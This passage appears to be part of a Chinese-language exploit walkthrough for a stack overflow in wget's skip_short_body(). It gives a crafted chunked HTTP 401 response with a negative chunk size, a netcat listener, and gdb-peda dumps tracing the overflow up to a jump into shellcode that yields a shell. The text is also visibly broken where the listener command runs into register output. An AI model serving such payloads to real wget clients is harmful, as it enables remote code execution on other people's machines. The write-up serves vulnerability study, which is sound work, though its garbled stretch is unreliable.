        PIE:      No PIE (0x400000)
        RWX:      Has RWX segments
好了，接下来可以搞事情了。为了方便确认栈溢出的地址，把前面 payload 的 body 部分用 pattern 替代掉：
    $ cat payload 
    HTTP/1.1 401 Not Authorized
    Content-Type: text/plain; charset=UTF-8
    Transfer-Encoding: chunked
    Connection: keep-alive
    -0xFFFFFD00
    AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyAAzA%%A%sA%BA%$A%nA%CA%-A%(A%DA%;A%)A%EA%aA%0A%FA%bA%1A%GA%cA%2A%HA%dA%3A%IA%eA%4A%JA%fA%5A%KA%gA%6A%LA%hA%7A%MA%iA%8A%NA%jA%9A%OA%kA%PA%lA%QA%mA%RA%oA%SA%pA%TA%qA%UA%rA%VA%tA%WA%uA%XA%vA%YA%wA%ZA%xA%yA%zAs%AssAsBAs$AsnAsCAs-As(AsDAs;As)AsEAsaAs0AsFAsbAs1AsGAscAs2AsHAsdAs3AsIAseAs4AsJAsfAs5AsKAsgAs6AsLAshAs7AsMAsiAs8AsNAsjAs9AsOAskAsPAslAsQAsmAsRAsoAsSAspAsTAsqAsUAsrAsVAstAsWAsuAsXAsvAsYAswAsZAsxAs
    0
    $ nc -lp 6666  0x206f4e0050545448 ('HTTP')
    RCX: 0xffffffda 
    RDX: 0x1 
    RSI: 0xfffffd00 
    RDI: 0x6aafab --> 0xfae98148c931000a 
    RBP: 0x7fffffffd170 --> 0x7fffffffd580 --> 0x7fffffffd8a0 --> 0x7fffffffd9c0 --> 0x7fffffffdbd0 --> 0x452350 (:    push   r15)
    RSP: 0x7fffffffcf20 --> 0xffffffffffffffff 
    RIP: 0x41ef0f (:    mov    QWORD PTR [rbp-0x8],rax)
    R8 : 0x0 
    R9 : 0xfffffffffffffff 
    R10: 0x0 
    R11: 0x7ffff74045e0 --> 0x2000200020002 
    R12: 0x404ca0 (:    xor    ebp,ebp)
    R13: 0x7fffffffdcb0 --> 0x2 
    R14: 0x0 
    R15: 0x0
    EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x41ef04 :    mov    rsi,rcx
       0x41ef07 :    mov    rdi,rax
       0x41ef0a :    call   0x404660 
    => 0x41ef0f :    mov    QWORD PTR [rbp-0x8],rax
       0x41ef13 :    mov    rax,QWORD PTR [rbp-0x10]
       0x41ef17 :    mov    rdi,rax
       0x41ef1a :    call   0x404380 
       0x41ef1f :    mov    QWORD PTR [rbp-0x10],0x0
    [------------------------------------stack-------------------------------------]
    0000| 0x7fffffffcf20 --> 0xffffffffffffffff 
    0008| 0x7fffffffcf28 --> 0x4ffffcf01 
    0016| 0x7fffffffcf30 --> 0x13 
    0024| 0x7fffffffcf38 --> 0x6aafab --> 0xfae98148c931000a 
    0032| 0x7fffffffcf40 --> 0xffffffff00000028 
    0040| 0x7fffffffcf48 --> 0x7ffff7652540 --> 0xfbad2887 
    0048| 0x7fffffffcf50 --> 0x7fffffffcfc0 ("401 Not Authorized\n")
    0056| 0x7fffffffcf58 --> 0x13 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x000000000041ef0f in skip_short_body ()
继续调试，到达函数 `fd_read()`，可以看到由于强制类型转换的原因其参数只取出了 0xffffffff00000300 的低 4 个字节
0x300，所以该函数将读入 0x300 个字节的数据到栈地址 0x7fffffffcf40 中：
    gdb-peda$ n
    [----------------------------------registers-----------------------------------]
    RAX: 0x4 
    RBX: 0x468722 --> 0x206f4e0050545448 ('HTTP')
    RCX: 0x7fffffffcf40 --> 0xffffffff00000028 
    RDX: 0x300 
    RSI: 0x7fffffffcf40 --> 0xffffffff00000028 
    RDI: 0x4 
    RBP: 0x7fffffffd170 --> 0x7fffffffd580 --> 0x7fffffffd8a0 --> 0x7fffffffd9c0 --> 0x7fffffffdbd0 --> 0x452350 (:    push   r15)
    RSP: 0x7fffffffcf20 --> 0xffffffff00000300 
    RIP: 0x41efd6 (:    call   0x4062c5 )
    R8 : 0x0 
    R9 : 0x1 
    R10: 0x0 
    R11: 0x7ffff74045e0 --> 0x2000200020002 
    R12: 0x404ca0 (:    xor    ebp,ebp)
    R13: 0x7fffffffdcb0 --> 0x2 
    R14: 0x0 
    R15: 0x0
    EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x41efc9 :    movsd  xmm0,QWORD PTR [rip+0x4aa6f]        # 0x469a40
       0x41efd1 :    mov    rsi,rcx
       0x41efd4 :    mov    edi,eax
    => 0x41efd6 :    call   0x4062c5 
       0x41efdb :    mov    DWORD PTR [rbp-0x14],eax
       0x41efde :    cmp    DWORD PTR [rbp-0x14],0x0
       0x41efe2 :    jg     0x41f029 
       0x41efe4 :    movzx  eax,BYTE PTR [rip+0x269bf0]        # 0x688bdb 
    Guessed arguments:
    arg[0]: 0x4 
    arg[1]: 0x7fffffffcf40 --> 0xffffffff00000028 
    arg[2]: 0x300 
    arg[3]: 0x7fffffffcf40 --> 0xffffffff00000028 
    [------------------------------------stack-------------------------------------]
    0000| 0x7fffffffcf20 --> 0xffffffff00000300 
    0008| 0x7fffffffcf28 --> 0x4ffffcf01 
    0016| 0x7fffffffcf30 --> 0x13 
    0024| 0x7fffffffcf38 --> 0x6aafab --> 0xfae98100007ffff7 
    0032| 0x7fffffffcf40 --> 0xffffffff00000028 
    0040| 0x7fffffffcf48 --> 0x7ffff7652540 --> 0xfbad2887 
    0048| 0x7fffffffcf50 --> 0x7fffffffcfc0 ("401 Not Authorized\n")
    0056| 0x7fffffffcf58 --> 0x13 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x000000000041efd6 in skip_short_body ()
成功跳转到 shellcode，获得 shell：
    gdb-peda$ n
    [----------------------------------registers-----------------------------------]
    RAX: 0x0 
    RBX: 0x468722 --> 0x206f4e0050545448 ('HTTP')
    RCX: 0x7ffff7384260 (:    cmp    rax,0xfffffffffffff001)
    RDX: 0x200 
    RSI: 0x7fffffffcf40 --> 0xfffae98148c93148 
    RDI: 0x4 
    RBP: 0x4141414141414141 ('AAAAAAAA')
    RSP: 0x7fffffffd178 --> 0x7fffffffcf40 --> 0xfffae98148c93148 
    RIP: 0x41f0ed (:    ret)
    R8 : 0x7fffffffcdb0 --> 0x383 
    R9 : 0x1 
    R10: 0x0 
    R11: 0x246 
    R12: 0x404ca0 (:    xor    ebp,ebp)
    R13: 0x7fffffffdcb0 --> 0x2 
    R14: 0x0 
    R15: 0x0
    EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    [-------------------------------------code-------------------------------------]
       0x41f0e2 :    call   0x42a0f5 
       0x41f0e7 :    mov    eax,0x1
       0x41f0ec :    leave  
    => 0x41f0ed :    ret    
       0x41f0ee :    push   rbp
       0x41f0ef :    mov    rbp,rsp
       0x41f0f2 :    sub    rsp,0x30
       0x41f0f6 :    mov    QWORD PTR [rbp-0x28],rdi
    [------------------------------------stack-------------------------------------]
    0000| 0x7fffffffd178 --> 0x7fffffffcf40 --> 0xfffae98148c93148 
    0008| 0x7fffffffd180 --> 0xa300a ('\n0\n')
    0016| 0x7fffffffd188 --> 0x0 
    0024| 0x7fffffffd190 --> 0x7fffffffdad4 --> 0x0 
    0032| 0x7fffffffd198 --> 0x7fffffffd780 --> 0x0 
    0040| 0x7fffffffd1a0 --> 0x6a9a00 --> 0x68acb0 ("http://localhost:6666/")
    0048| 0x7fffffffd1a8 --> 0x6a9a00 --> 0x68acb0 ("http://localhost:6666/")
    0056| 0x7fffffffd1b0 --> 0x0 
    [------------------------------------------------------------------------------]
    Legend: code, data, rodata, value
    0x000000000041f0ed in skip_short_body ()
    gdb-peda$ x/20gx 0x7fffffffcf40
    0x7fffffffcf40:    0xfffae98148c93148    0xffffef058d48ffff  
* * *